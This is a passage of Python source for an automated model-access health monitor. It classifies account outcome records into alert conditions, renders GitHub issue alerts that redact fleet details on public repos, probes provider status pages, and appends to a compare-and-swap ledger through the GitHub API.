            "condition": "persistent-transient",
            "provider": provider,
            "fire": bool(persistent) and not recovered,
            "class_counts": counts,
            "reason": (f"{len(transient_recent)} transient/unknown API failures in "
                       f"{TRANSIENT_WINDOW_SECONDS // 60} min "
                       f"({composition}; persistent, not a blip)"
                       if persistent
                       else "a model launch succeeded again" if recovered
                       else "transient failures are within blip tolerance"),
        })

        # ---- account-auth-cooldown (registry #596) ----------------------------------------------
        # A run of consecutive `auth` outcomes on one account is a CREDENTIAL OUTAGE the maintainer
        # must fix (re-mint the setup-token) — it is NOT a model decline, and it never self-heals by
        # retrying. The action is keyed on (condition, provider) like every other, so the upsert
        # raises the alert EXACTLY ONCE for the whole outage and refreshes it thereafter rather than
        # commenting per failed run; it recovers (fire=False -> the issue closes) as soon as the
        # account authenticates again, which is also when the cooldown clears.
        #
        # The body names only the SALTED FINGERPRINT (locked decision 22a) — never the acctNN handle
        # or the account email — and the fingerprints ride the same private-route redaction as every
        # other count in render_body.
        cooled = sorted(acct for acct in cooldowns if acct in observed)
        actions.append({
            "condition": "account-auth-cooldown",
            "provider": provider,
            "fire": bool(cooled),
            "accounts": cooled,
            "reason": (f"{len(cooled)} {provider} account(s) hit >= "
                       f"{AUTH_COOLDOWN_MIN} consecutive `auth` failures and are in a bounded "
                       "credential cooldown"
                       if cooled
                       else "no account is in a credential cooldown"),
        })

        # ---- provider-capped -------------------------------------------------------------------
        # Every ENABLED account of the provider is usage-limited within the window. STALENESS
        # (review defect #1): a limit record is invalidated by any LATER success from the SAME
        # account (records iterated in ts order), so `A limit -> A success -> B limit` caps only
        # B. Individual capped accounts are normal window churn and are deliberately NOT alerted.
        # The earliest known reset is surfaced so the maintainer knows when capacity restores.
        if enabled:
            capped = {}
            for r in prov_records:
                acct = r.get("account")
                if acct not in enabled:
                    continue
                if r.get("exit_class") == CLASS_LIMIT:
                    capped.setdefault(acct, r.get("reset_hint"))
                elif r.get("exit_class") == SUCCESS:
                    capped.pop(acct, None)   # a LATER success invalidates the stale cap
            all_capped = set(capped) >= enabled and enabled
            reset_hints = sorted(h for h in capped.values() if h)
            actions.append({
                "condition": "provider-capped",
                "provider": provider,
                "fire": bool(all_capped),
                "reason": (f"all {len(enabled)} enabled {provider} accounts are usage-limited"
                           if all_capped
                           else f"{len(capped)}/{len(enabled)} accounts capped (normal churn)"),
                "reset_hint": reset_hints[0] if reset_hints else None,
            })

    # ---- orphaned open alerts (issue #205) -----------------------------------------------------
    # An alert whose provider has DISAPPEARED from the rolling window gets no action above, so it
    # would never be closed. Emit an explicit recovery for each open marker the record-driven pass
    # did not cover whose provider is absent from the window — this is the union of "providers with
    # records" and "providers with an open alert", so recovery no longer relies on the provider
    # still being present. A provider still in the window is left to its per-condition logic.
    emitted = {(a["condition"], a["provider"]) for a in actions}
    for condition, provider in sorted(set(open_alerts)):
        if (condition, provider) in emitted or provider in providers:
            continue
        actions.append({
            "condition": condition,
            "provider": provider,
            "fire": False,
            "reason": "no records remain in the window for this provider — the alert is stale "
                      "and is being cleared",
        })

    return actions


def _marker(condition, provider):
    return f"<!-- {MARKER_PREFIX}:{condition}:{provider} -->"


# The (condition, provider) pair carried by a hidden alert marker. condition/provider are keyword
# tokens (no colon or whitespace), so the char classes stop cleanly before the ` -->` close.
_MARKER_RE = re.compile(re.escape(MARKER_PREFIX) + r":([^\s:>]+):([^\s:>]+)")


def parse_alert_markers(bodies):
    """The set of (condition, provider) pairs found in the given issue bodies (issue #205). PURE
    so it is unit-tested without gh: `decide` feeds the resulting set to classify_records so an
    alert whose provider aged out of the window still earns an explicit recovery."""
    markers = set()
    for body in bodies:
        if isinstance(body, str):
            markers.update(_MARKER_RE.findall(body))
    return markers


def _alert_title(condition, provider):
    labels = {
        "provider-outage": f"model access OUTAGE — provider `{provider}`",
        "persistent-transient": f"persistent transient model errors — provider `{provider}`",
        "provider-capped": f"provider `{provider}` fully usage-CAPPED",
        "account-auth-cooldown": (f"`{provider}` worker credential is REJECTED — re-mint required"),
        "zero-dispatch": "dispatcher launched nothing while work was ready",
    }
    return f"⚠️ {labels.get(condition, condition)}"


def render_body(action, maintainer, redact=False):
    """Alert body. Enumerates NO account handles (records carry only salted hashes; a hash is not
    maintainer-actionable and would only clutter) — the actionable facts are the provider, the
    condition, and any reset time.

    PUBLIC-registry route (redact=True, sol-audit issue #204): when the alert lands on the PUBLIC
    registry repo — because no verified private ALERT_REPO+ALERT_TOKEN route is configured, or a
    private token proved unusable and the alert fell back (issue #175) — the body carries ONLY the
    provider and condition (none of which is a handle, a count, or a reset time) and SUPPRESSES the
    failure/fleet COUNTS (the `reason` string), the reset hints, and the status diagnostics that
    would compositionally disclose the account infrastructure on a public repo. The marker is kept
    either way so the idempotent upsert still finds/reopens the rolling issue. The full breakdown
    is emitted only over the verified private route."""
    cond = action["condition"]
    lines = [_marker(cond, action["provider"]),
             "> 🤖 SPARQ agent — automated model-access health alert.\n"]
    if redact:
        lines.append(
            f"⚠️ **Model-access health for provider `{action['provider']}` is degraded "
            f"(`{cond}`).** The failure/fleet counts, reset times, and diagnostics are SUPPRESSED "
            "because this alert landed on the **public** registry repo, where they would "
            "compositionally disclose the worker-account fleet. To receive the full breakdown "
            "privately, configure a private `ALERT_REPO` together with an `ALERT_TOKEN` secret "
            "that can write to it (the private route is used only when BOTH are set).")
        lines.append(f"\n@{maintainer} — this issue updates itself and closes automatically on the "
                     "first successful model launch for this provider.")
        return "\n".join(lines)
    if cond == "provider-outage":
        lines.append(f"🚨 **Provider `{action['provider']}` model access is DOWN.** "
                     f"{action['reason']}. Every recent launch on this provider failed — the "
                     "pipeline is stalled for this provider, not idle.")
        lines.append("\nLikely causes: an Anthropic/OpenAI-side API incident, every token expired, "
                     "or credits exhausted. Check the provider status page; rotate tokens "
                     "(`claude setup-token` / codex `login --device-auth`) if it is credential.")
    elif cond == "persistent-transient":
        if (action.get("class_counts") or {}).get(CLASS_UNKNOWN):
            # Review #72 finding 2: an unknown/mixed burst must not be described as retryable
            # 429s — part of it was never attributed to the provider at all.
            lines.append(f"⚠️ **Provider `{action['provider']}` launches are failing in a "
                         f"sustained burst.** {action['reason']}. Part of the burst is "
                         "UNATTRIBUTABLE (timeouts/cancellations/pre-launch aborts), so treat "
                         "the failure class as unconfirmed until the run logs say otherwise.")
        else:
            lines.append(f"⚠️ **Provider `{action['provider']}` is throwing sustained transient "
                         f"errors.** {action['reason']}. These are individually retryable "
                         "(429/529/overloaded) but the burst is degrading throughput.")
    elif cond == "provider-capped":
        lines.append(f"⏳ **Every enabled `{action['provider']}` account is usage-capped.** "
                     f"{action['reason']}.")
        if action.get("reset_hint"):
            lines.append(f"\nEarliest known reset: **{action['reset_hint']}** — capacity should "
                         "self-restore then. Reset a subscription window sooner to unblock.")
    elif cond == "account-auth-cooldown":
        # Fingerprints ONLY (locked decision 22a): the salted 16-hex hash is what the ledger holds,
        # and it is what the maintainer's own email->reset fingerprint map resolves. The raw acctNN
        # handle and the account email NEVER appear here. This branch is unreachable on the public
        # route — `redact` returns above — so the fingerprints only ever land on a verified private
        # repository.
        fingerprints = ", ".join(f"`{a}`" for a in (action.get("accounts") or [])) or "(unknown)"
        lines.append(
            f"🔑 **A `{action['provider']}` worker credential is being REJECTED, not "
            f"rate-limited.** {action['reason']}. Account fingerprint(s): {fingerprints}.")
        lines.append(
            "\n**Maintainer action required — re-mint the credential** (`claude setup-token` for "
            "anthropic, `codex login --device-auth` for openai) and re-upload the account secret. "
            "See jeswr/agent-account-registry#596: a codex OAuth **access** token expires hourly, "
            "so a static snapshot of one dies within the hour no matter how it was minted — the "
            "durable fix is storing refresh-capable material.")
        lines.append(
            f"\nUntil then the allocator skips the account for a bounded "
            f"{AUTH_COOLDOWN_SECONDS // 60}-minute cooldown and then tries again — deliberately "
            "NOT a permanent disable, because this may be the only cross-provider review account "
            "and zero reviews is worse than a partial success rate. Nothing about this counts as a "
            "model decline: `auth` outcomes consume no review round and no attempt budget "
            "(registry #596), so no PR or issue is parked on account of it.")
    elif cond == "zero-dispatch":
        lines.append(f"🚨 **The dispatcher planned ready work but launched NOTHING.** "
                     f"{action['reason']}. Ready issues exist but no worker started — a capacity, "
                     "access, or lease-contention problem, not an empty backlog.")
    advice = _status_advice(action)
    if advice:
        lines.append(advice)
    lines.append(f"\n@{maintainer} — this issue updates itself and closes automatically on the "
                 "first successful model launch for this provider.")
    return "\n".join(lines)


# ---------------------------------------------------------------------------------------------
# provider status probe (issue #70) — pure fold + fail-open fetch + decide-time annotation
# ---------------------------------------------------------------------------------------------
def classify_status_payload(payload):
    """PURE fold of a Statuspage status.json document into (status, raw_indicator). Any shape
    surprise — non-dict payload, missing keys, non-string or unrecognised indicator — is
    `unknown`, never an exception: the probe must not be able to break `decide`."""
    if not isinstance(payload, dict):
        return STATUS_UNKNOWN, ""
    status = payload.get("status")
    indicator = status.get("indicator") if isinstance(status, dict) else None
    if not isinstance(indicator, str):
        return STATUS_UNKNOWN, ""
    return _INDICATOR_MAP.get(indicator, STATUS_UNKNOWN), indicator


def _fetch_status_json(url, deadline=STATUS_PROBE_DEADLINE_SECONDS):
    """GET one of the two fixed PROVIDER_STATUS_URLS (never a caller-built URL). Review #72
    round 3: the socket timeout bounds only individual blocking operations, so a peer that
    trickles data can exceed it indefinitely — the whole request therefore runs in a DAEMON
    thread that is ABANDONED after `deadline` wall-clock seconds (daemon: it cannot block
    interpreter exit), and the body is read in bounded chunks with a hard size cap. Any
    transport, parse, size, or deadline failure raises HealthError for the fail-open above."""
    import http.client
    import threading

    def fetch_bounded():
        from urllib.request import Request, urlopen
        request = Request(url, headers={"User-Agent": "registry-model-health"})
        with urlopen(request, timeout=STATUS_PROBE_TIMEOUT_SECONDS) as response:
            chunks, size = [], 0
            while True:
                chunk = response.read(65536)
                if not chunk:
                    break
                size += len(chunk)
                if size > STATUS_PROBE_MAX_BYTES:
                    raise HealthError("provider status response exceeds size bound")
                chunks.append(chunk)
        return json.loads(b"".join(chunks).decode())

    outcome = {}

    def run():
        try:
            outcome["value"] = fetch_bounded()
        except BaseException as exc:  # re-raised/normalized below on the caller's thread
            outcome["error"] = exc

    worker = threading.Thread(target=run, name="status-probe", daemon=True)
    worker.start()
    worker.join(deadline)
    if worker.is_alive():
        raise HealthError("provider status probe exceeded wall-clock deadline")
    if "error" in outcome:
        exc = outcome["error"]
        if isinstance(exc, HealthError):
            raise exc
        if isinstance(exc, (OSError, http.client.HTTPException, ValueError)):
            # OSError subsumes URLError/HTTPError/TimeoutError AND the raw socket errors
            # (ConnectionResetError etc.) that response.read() can raise mid-body; HTTPException
            # covers a truncated/half-closed response (http.client.IncompleteRead). Review #72
            # finding 1: neither was normalized before, so a mid-read failure escaped HealthError
            # and aborted _cmd_decide BEFORE the alert upsert — the one failure mode the fail-open
            # design forbids. ValueError covers both JSONDecodeError and UnicodeDecodeError.
            raise HealthError("provider status probe failed") from exc
        raise exc  # unnormalized surprise: probe_provider_status's broad backstop folds it


def probe_provider_status(provider, fetch=None):
    """(status, indicator) from the provider's public status page. FAIL-OPEN (mutation-checked):
    an unmapped provider, an unreachable API, or a malformed body all return ('unknown', '') —
    and the caller must never suppress an alert on that basis."""
    url = PROVIDER_STATUS_URLS.get(provider)
    if not url:
        return STATUS_UNKNOWN, ""
    try:
        payload = (fetch or _fetch_status_json)(url)
    except HealthError:
        return STATUS_UNKNOWN, ""
    except Exception:
        # Defensive backstop at the annotation boundary (review #72 finding 1): the probe is
        # ANNOTATION ONLY and must NEVER be able to abort `decide` (which would suppress the
        # alert upsert), so even an exception class the fetch failed to normalize folds to
        # unknown. Deliberately broad — narrowing it reopens the suppress-on-crash hole.
        return STATUS_UNKNOWN, ""
    return classify_status_payload(payload)


def annotate_provider_status(actions, probe=None):
    """Attach provider_status/status_indicator to the FIRING outage/transient actions, one probe
    per provider per decide tick (cached; a quiet tick makes NO network call). ANNOTATION ONLY:
    `fire` is never touched here — a green status page reframes the alert as self-induced, it
    does not silence it."""
    cache = {}
    for action in actions:
        if action["condition"] not in PROBED_CONDITIONS or not action["fire"]:
            continue
        provider = action["provider"]
        if provider not in cache:
            cache[provider] = (probe or probe_provider_status)(provider)
        action["provider_status"], action["status_indicator"] = cache[provider]
    return actions


def _status_display(status, indicator):
    """`degraded (minor)` / `outage (major|critical)`; operational/unknown carry no qualifier."""
    if status in (STATUS_DEGRADED, STATUS_OUTAGE) and indicator:
        return f"{status} ({indicator})"
    return status


def _status_advice(action):
    """The provider-status annotation line for an alert body, or None when the action was not
    probed. operational + transient burst -> SELF-INDUCED + shed parallelism; degraded/outage ->
    known-incident framing + harder backoff; unknown -> state the fail-open explicitly."""
    status = action.get("provider_status")
    if not status:
        return None
    head = ("\n`provider-status: "
            f"{_status_display(status, action.get('status_indicator') or '')}`")
    if status == STATUS_OPERATIONAL:
        if action["condition"] == "persistent-transient":
            # SELF-INDUCED is claimed ONLY for a qualifying TRUE-transient burst: the
            # provider-attributed transient count must clear the persistence threshold on its
            # own (review #72 finding 2 — an unknown/mixed burst that fired on unattributable
            # timeouts/cancellations proves nothing about rate limits, so advising "shed
            # parallelism" there is a false diagnosis). Missing counts fall to the unverified
            # framing: never claim self-induction on evidence we do not hold.
            counts = action.get("class_counts") or {}
            if counts.get(CLASS_TRANSIENT, 0) >= TRANSIENT_MIN_FAILS:
                return (head + " — **likely SELF-INDUCED.** The provider's public status page "
                        "reports no incident, so this burst is most consistent with over-"
                        "parallelization on our side (concurrent workers sharing the same "
                        "rate-limit windows). SHED PARALLELISM — run fewer concurrent workers "
                        "on this provider — rather than retrying at the same width.")
            return (head + " — **cause UNVERIFIED.** The status page is green, but this burst "
                    "is not a clean rate-limit signature: it leans on UNATTRIBUTABLE failures "
                    "(timeouts / cancellations / pre-launch aborts the host could not pin on "
                    "the provider). Do NOT assume self-induced rate limiting — inspect the "
                    "failing run logs to attribute the burst before shedding parallelism or "
                    "blaming the provider.")
        return (head + " — the status page is green while every launch fails, which points at "
                "our side (expired tokens / exhausted credits), not a provider incident.")
    if status in (STATUS_DEGRADED, STATUS_OUTAGE):
        return (head + " — **known provider incident.** The status page confirms a provider-side "
                "problem, so this is not local misbehaviour: back off HARDER (longer retry "
                "spacing, reduced dispatch width) and wait out the incident before blaming "
                "accounts or tokens.")
    return (head + " — the status API probe failed, so provider health is unverified. This alert "
            "fails OPEN: it is NEVER suppressed on a probe failure — treat the failures as "
            "possibly provider-side.")


# ---------------------------------------------------------------------------------------------
# CAS ledger I/O over the GitHub contents API (mirrors groom.py _read_ledger/_release_claims)
# ---------------------------------------------------------------------------------------------
class HealthError(RuntimeError):
    """A concise, credential-free operational error."""


class HealthConflict(HealthError):
    """A retryable contents-API compare-and-swap conflict."""


def ledger_read_path(registry_repo):
    """Contents-API GET path for the model-health ledger, pinned to the data-plane branch."""
    return f"/repos/{registry_repo}/contents/{LEDGER_PATH}?ref={LEDGER_REF}"


def read_ledger(api, registry_repo):
    """Return (records, sha). A MISSING ledger FILE on a present ledger branch (first ever record)
    is not an error — it seeds an empty window with sha=None so the first PUT creates it. A MISSING
    ledger BRANCH fails LOUD (issue #28): silently-empty would hide the exact outage class this
    ref exists to prevent."""
    result = api.request("GET", ledger_read_path(registry_repo), allow_404=True)
    if result is None:
        if api.request("GET", f"/repos/{registry_repo}/git/ref/heads/{LEDGER_REF}",
                       allow_404=True) is None:
            raise HealthError(
                f"ledger branch '{LEDGER_REF}' is missing — create it from master "
                "(see data/README.md) before recording model health")
        return [], None
    if not isinstance(result, dict):
        raise HealthError("model-health ledger response is malformed")
    content, sha = result.get("content"), result.get("sha")
    if not isinstance(content, str) or not isinstance(sha, str) or not sha:
        raise HealthError("model-health ledger metadata is malformed")
    try:
        document = json.loads(base64.b64decode("".join(content.split()), validate=True).decode())
    except (ValueError, UnicodeDecodeError) as exc:
        raise HealthError("model-health ledger content is malformed") from exc
    return validate_ledger(document), sha


# --- CAS retry backoff (issue #200; same full-jitter schedule as select-and-claim._sleep_backoff,
# issue #179). The record writer is one of the CAS writers #179 named as STILL retrying in
# lockstep: every worker/reviewer/fixer/dispatch tick appends to this single blob, so a synchronized
# completion burst collided on every one of its six NO-DELAY attempts and exhausted them, silently
# discarding records (an outage then reads below threshold). An exponential FULLY JITTERED sleep
# between attempts decorrelates the writers so a loser backs off a random amount and the tip has
# settled by its next read; the count is raised so a genuinely contended write still lands. The
# ceiling is split from the random draw so the schedule is unit-tested without the RNG, and
# _sleep_backoff is module-level so --self-test can stub it without sleeping.
CAS_RETRIES = 8


def _backoff_ceiling(attempt, base=0.5, cap=8.0):
    """Upper bound (seconds) for the sleep before CAS retry `attempt` (1-based): exponential
    base*2**(attempt-1), clamped to `cap`."""
    return ledger_retry.backoff_ceiling(attempt, base, cap)


def _backoff_delay(attempt):
    return random.uniform(0, _backoff_ceiling(attempt))


def _sleep_backoff(attempt):
    """Sleep a full-jitter exponential backoff before CAS retry `attempt` (module-level so the
    self-test can stub it without sleeping)."""
    ledger_retry.sleep_backoff(attempt, sleeper=time.sleep, draw=random.uniform)


def _record_identity(record):
    """Idempotency key (issue #200): the fields that identify one underlying OUTCOME, so a REPLAY of
    the same outcome is recognised and never appended twice — a duplicate would double-count toward
    the derived per-account backoff and the alert thresholds (a false escalation). Keyed on the FULL
    run_id — `GITHUB_RUN_ID.<attempt of the job that PRODUCED the outcome>` — plus provider, salted
    account, folded class and model alias. Deliberately NOT the write-time ts.

    The attempt component must be the PRODUCING job's attempt, never the recorder's own (review
    round 1 of #425 — stripping the attempt here collapsed BOTH cases into one): a re-run of ONLY
    the failed recorder replays the producing job's PRESERVED outputs, so the same producing
    attempt arrives again and the replay dedups, while a full workflow re-run under the same
    GITHUB_RUN_ID re-executes the producing job, which stamps a fresh attempt — that genuinely new
    outcome (e.g. a second real rate-limit) must keep counting toward backoff/alert thresholds.
    The call sites uphold this: worker.yml/review-fix.yml surface the producing job's
    GITHUB_RUN_ATTEMPT as an output beside exit_class, and dispatch.yml records inside the
    producing job itself.

    Returns None when run_id is empty — an unkeyed record cannot be safely deduplicated (distinct
    outcomes could share the remaining fields), so it always appends (fail toward recording)."""
    if not isinstance(record, dict):
        return None
    run_id = record.get("run_id")
    if not isinstance(run_id, str) or not run_id:
        return None
    return (run_id, record.get("provider"), record.get("account"),
            record.get("exit_class"), record.get("model_alias"))


def fleet_idle_is_redundant(records, now):
    """[issue #341] THE NON-FLOODING GATE, pure so it is unit-tested without gh. True when the
    fleet's NEWEST in-window record is already `idle`, i.e. another empty-frontier record would say
    something the window already says.

    WHY A GATE AT ALL. dispatch ticks roughly every 10 minutes plus doorbell triggers (~288+
    scheduled ticks per 48 h WINDOW_HOURS) against MAX_RECORDS=200, so recording every idle tick
    would evict the real per-provider health signal the outage/transient/capped conditions are
    derived from — a recovery mechanism that blinds the detectors it shares a window with is a net
    loss. Suppressing the redundant repeat bounds the fleet's idle records at ONE PER TRANSITION
    into quiet, which is exactly the evidence classify_records needs: it reads an `idle` record as
    a BOUNDARY that ends the consecutive zero-dispatch run, and a run of idle ticks collapses into
    a single boundary, so the suppressed repeats carry no information the first record does not.

    It costs no extra API call: append_record already reads the ledger before its CAS write, so
    this runs on records that are in hand. The suppressed case skips the WRITE outright.

    Only the WINDOW counts: a record older than WINDOW_SECONDS (or implausibly future-stamped) is
    invisible to classify_records, so it must not suppress a write here either — an `idle` that has
    aged out is not evidence of anything. Falls back to False (write) whenever the newest record is
    anything else or there is no fleet record at all, so the gate can only ever suppress a
    provably-redundant duplicate; it can never drop the first idle record of a quiet stretch.

    `newest` is resolved EXACTLY as classify_records resolves it — a STABLE sort by ts, then the
    last element — so same-second records (two ticks whose write stamps collide) break the tie by
    ledger append order in both places. A `max()` here would have taken the FIRST of the tied
    records instead and suppressed a write the classifier had already moved past."""
    fleet = sorted((r for r in records
                    if isinstance(r, dict)
                    and r.get("provider") == FLEET_PSEUDO_PROVIDER
                    and isinstance(r.get("ts"), int) and not isinstance(r.get("ts"), bool)
                    and (now - r["ts"]) <= WINDOW_SECONDS
                    and r["ts"] <= now + FUTURE_SKEW_SECONDS),
                   key=lambda r: r["ts"])
    if not fleet:
        return False
    return fleet[-1].get("exit_class") == CLASS_IDLE


def append_record(api, registry_repo, record, now, retries=CAS_RETRIES, skip_if=None):
    """CAS-append one record and prune the window (bounded write). Retries on conflict with a
    full-jitter exponential backoff BETWEEN attempts (issue #200) — a synchronized completion burst
    that retried in lockstep with no delay could exhaust the budget and DISCARD records. The write
    is IDEMPOTENT: if this exact outcome is already on the ledger (a re-run of the failed recorder
    replaying the producing job's preserved outputs — same producing-job attempt in run_id, outcome
    unchanged), the append is a confirmed no-op, so a duplicate can never falsely escalate the
    derived backoff or an alert. A re-EXECUTED outcome (full re-run: same GITHUB_RUN_ID, fresh
    producing-job attempt) is NOT a replay and still appends. Returns the pruned
    record count on success, or the unchanged window count on a dedup no-op.

    `skip_if(records, now) -> bool` (issue #341) is an optional REDUNDANCY gate evaluated against
    the ledger this writer has already read: True suppresses the write and returns the unchanged
    window count. It is a NON-FLOODING device for the fleet's `idle` signal, never a correctness
    device — it must never be handed a predicate that could suppress a record some threshold
    counts, because a suppressed record is indistinguishable from a tick that never happened."""
    identity = _record_identity(record)
    for attempt in range(retries):
        if attempt:
            _sleep_backoff(attempt)   # backoff fires BETWEEN attempts, never before the first read
        records, sha = read_ledger(api, registry_repo)
        # Idempotent no-op: this outcome is already recorded (a replayed recorder). Do NOT append a
        # duplicate that would double-count toward backoff/alert escalation (issue #200).
        if identity is not None and any(_record_identity(r) == identity for r in records):
            return len(prune(records, now))
        if skip_if is not None and skip_if(records, now):
            return len(prune(records, now))
        records = prune(records + [record], now)
        # Validate the COMPLETE assembled document before the PUT (issue #202): a malformed record —
        # e.g. a raw handle that bypassed make_record — must fail LOUD here, never leak to the PUBLIC
        # ledger and then get rejected by every subsequent reader (a silent self-poisoning write).
        # TWO POSTURES, and the split is the point (issue #739). The record THIS run introduces is
        # checked on the WRITE side, so its field vocabulary stays closed and this release can never
        # PUT an undeclared field. The assembled document — which carries records written by OTHER
        # releases straight back through this read-modify-write — is checked on the READ side, so a
        # newer writer's additive field neither blocks this append nor is silently erased by it.
        try:
            _validate_record(record, ORIGIN_WRITE)
            validate_ledger({"records": records})
        except ValueError as exc:
            raise HealthError(f"refusing to write a malformed model-health record: {exc}") from exc
        encoded = base64.b64encode(
            (json.dumps({"records": records}, indent=1) + "\n").encode()).decode()
        body = {"message": f"model-health record ({record['provider']}/{record['exit_class']})",
                "content": encoded,
                "branch": LEDGER_REF}  # pin the data-plane branch, never the protected default
        if sha:
            body["sha"] = sha
        try:
            result = api.request(
                "PUT", f"/repos/{registry_repo}/contents/{LEDGER_PATH}", body, retry_conflict=True)
        except HealthConflict:
            continue
        if isinstance(result, dict) and isinstance(result.get("content"), dict):
            return len(records)
    raise HealthError("model-health ledger CAS conflicts did not settle")


class GitHubAPI:
    """Minimal contents/issues API client (same shape as groom.GitHubAPI). Kept local so the script
    has no cross-module import at CLI time; the salt/token never enter a target-code job."""

    def __init__(self, token):
        from urllib.request import Request  # Local import keeps --self-test import-light.
        if not token:
            raise HealthError("registry token is missing")
        self._token = token
        self._Request = Request

    def request(self, method, path, body=None, allow_404=False, retry_conflict=False):
        from urllib.error import HTTPError, URLError
        from urllib.request import urlopen
        if not path.startswith("/") or "\n" in path or "\r" in path:
            raise HealthError("unsafe GitHub API path")
        payload = json.dumps(body).encode() if body is not None else None
        request = self._Request(
            "https://api.github.com" + path, data=payload, method=method,
            headers={
                "Accept": "application/vnd.github+json",
                "Authorization": f"Bearer {self._token}",
                "User-Agent": "registry-model-health",
                "X-GitHub-Api-Version": "2022-11-28",
                **({"Content-Type": "application/json"} if payload is not None else {}),
            })
        try:
            with urlopen(request, timeout=30) as response:
                raw = response.read()
        except HTTPError as exc:
            if allow_404 and exc.code == 404:
                return None
            if retry_conflict and exc.code in {409, 422}:
                raise HealthConflict("model-health ledger compare-and-swap conflict") from exc
            raise HealthError(f"GitHub API {method} failed with HTTP {exc.code}") from exc
        except (URLError, TimeoutError) as exc:
            raise HealthError("GitHub API request failed") from exc
        try:
            return json.loads(raw or b"null")
        except json.JSONDecodeError as exc:
            raise HealthError("GitHub API returned malformed JSON") from exc

    def paginate(self, path):
        sep = "&" if "?" in path else "?"
        items = []
        for page in range(1, 21):
            result = self.request("GET", f"{path}{sep}per_page=100&page={page}")
            if not isinstance(result, list):
                raise HealthError("GitHub API returned a malformed page")
            items.extend(result)
            if len(result) < 100:
                return items
        raise HealthError("model-health snapshot may be truncated")


# ---------------------------------------------------------------------------------------------
# alert routing (issue #39 fix: ALERT_REPO without ALERT_TOKEN falls back to the registry repo)
# ---------------------------------------------------------------------------------------------
def _alert_target():
    """Where the alert issue lives + the token to write it with (locked decision 22c).

    ALERT_REPO (jeswr/agent-account-data) + ALERT_TOKEN routes the alert to a PRIVATE repo. THE #39
    FIX: when ALERT_REPO is set but ALERT_TOKEN is absent/empty, DO NOT fail silently (the old bug —
    the private write had no usable token so nothing was filed). Fall back to filing on the REGISTRY
    repo itself with the ambient workflow token. Account identifiers stay salted either way, and the
    body on any public-registry write is REDACTED to a generic signal (sol-audit #204: even the
    failure/fleet counts and reset hints disclose the fleet), so the fallback to the public registry
    leaks nothing — see render_body(redact=True)."""
    registry_repo = os.environ["REGISTRY_REPO"]
    alert_repo = os.environ.get("ALERT_REPO") or ""
    alert_token = os.environ.get("ALERT_TOKEN") or ""
    ambient = os.environ.get("REGISTRY_ALERT_TOKEN") or os.environ.get("GH_TOKEN") or ""
    if alert_repo and alert_token:
        return alert_repo, alert_token
    # ALERT_REPO set but no ALERT_TOKEN -> fall back to the registry repo (do not drop the alert).
    return registry_repo, ambient


def _registry_fallback():
    """The always-available public route: (registry_repo, ambient_token). Used at RUN TIME when
    the primary (private) route's token is present but UNUSABLE (issue #175) — a nonempty
    ALERT_TOKEN selects the private route without proving access, so an expired/wrong token would
    otherwise drop every alert while the run stays green. Identifiers are salted (decision 22a) and
    the retried body is REDACTED to a generic signal on this public route (sol-audit #204,
    render_body(redact=True)), so retrying the alert on the public registry leaks nothing."""
    return (os.environ["REGISTRY_REPO"],
            os.environ.get("REGISTRY_ALERT_TOKEN") or os.environ.get("GH_TOKEN") or "")


def _repo_confirmed_private(repo, token):
    """True ONLY on a definitive `"private": true` from GET /repos/{repo} read under the route
    token (sol review round 1 of #432). A configured ALERT_REPO+ALERT_TOKEN pair alone must never
    select the detailed body: the pair can name the public registry itself or any other public
    repository, and token presence proves nothing about destination visibility. FAIL-CLOSED: a
    failed lookup, an unparseable payload, or anything but a literal boolean true reads as NOT
    private and the caller redacts. The response body is parsed, never echoed."""
    proc = _gh(["api", f"repos/{repo}"], token, capture=True)
    if proc.returncode != 0:
        return False
    try:
        payload = json.loads(proc.stdout or "")
    except ValueError:
        return False
    return isinstance(payload, dict) and payload.get("private") is True


def _deliver_alerts(actions, maintainer, fallback_open=frozenset()):
    """Upsert every action on the primary route; on a failed FIRING action retry the salted alert
    on the public registry with the ambient token (issue #175). `fallback_open` is the set of
    (condition, provider) markers currently OPEN on the fallback route: the firing retry can
    CREATE an alert there, so a RECOVERY whose marker was seen on the fallback is delivered on
    BOTH routes and counts as delivered only when each route it targets confirms (review #340).
    Beyond that explicit binding, recoveries never fall back cross-repo — "no open issue" on a
    repository whose marker was never seen is a no-op that cannot confirm a close (review round
    2). A FIRING action that lands on the primary while its marker is still open on a fallback
    that is a DIFFERENT REPOSITORY closes the superseded fallback copy (issue #344), so a recovered
    primary route never leaves two divergent open copies of one alert; a fallback that differs only
    by token names the same issue, so it is never closed here (round 1 of #1455). Returns the actions still undelivered (empty == all
    delivered) so the caller can exit nonzero — an unusable alert token must fail the run, never
    silently drop the alert."""
    repo, token = _alert_target()
    fb_repo, fb_token = _registry_fallback()
    fb_distinct = (repo, token) != (fb_repo, fb_token) and bool(fb_token)
    # ...but the CREDENTIAL fallback and the CROSS-REPOSITORY dedup need different tests (review
    # round 1 of #1455). `fb_distinct` compares (repo, token) PAIRS, so ALERT_REPO == REGISTRY_REPO
    # with a distinct ALERT_TOKEN — a supported configuration — keeps the retry route armed while
    # both routes name ONE repository. `_cmd_decide` then enumerates that repository's own markers
    # into `fallback_open`, where the "superseded fallback copy" IS the live primary alert: closing
    # it would erase the only open firing issue. Dedup is therefore keyed on the repository NAME.
    fb_other_repo = fb_distinct and repo.strip().lower() != fb_repo.strip().lower()
    # A DETAILED body (failure/fleet counts + reset hints + diagnostics) is emitted ONLY over a
    # POSITIVELY VERIFIED private route (sol-audit issue #204, hardened in #432 round 1): an
    # ALERT_REPO distinct from the public registry repo (case-insensitive) AND confirmed
    # `"private": true` by a live GET /repos/{repo} under its ALERT_TOKEN — configuration alone
    # is not verification, since it can name the registry itself or any other public repository.
    # Everything else REDACTS to a generic signal: the #39 half-config primary (ALERT_REPO set
    # but no token -> primary IS the registry), a no-ALERT_REPO deployment, a same-repo or
    # public/unverifiable ALERT_REPO, the #175 firing retry on the registry, and any fallback
    # recovery. The registry_fallback route is always public, so its writes are always redacted.
    registry_repo = os.environ["REGISTRY_REPO"]
    primary_redact = (repo.strip().lower() == registry_repo.strip().lower()
                      or not _repo_confirmed_private(repo, token))
    if primary_redact and any(a.get("fire") for a in actions):
        # FAIL LOUD (issue #204): a firing model-health alert is being filed with fleet/failure
        # detail SUPPRESSED because no verified private route exists. The (public) log line carries
        # no count or reset — only that the private channel is missing.
        print("::warning::model-health: no verified private ALERT_REPO+ALERT_TOKEN route — "
              "model-health alerts SUPPRESS fleet/failure counts and reset times; the public "
              "issue carries a generic signal only")
    undelivered = []
    for action in actions:
        delivered = _upsert_alert(action, repo, token, maintainer, redact=primary_redact)
        if action["fire"]:
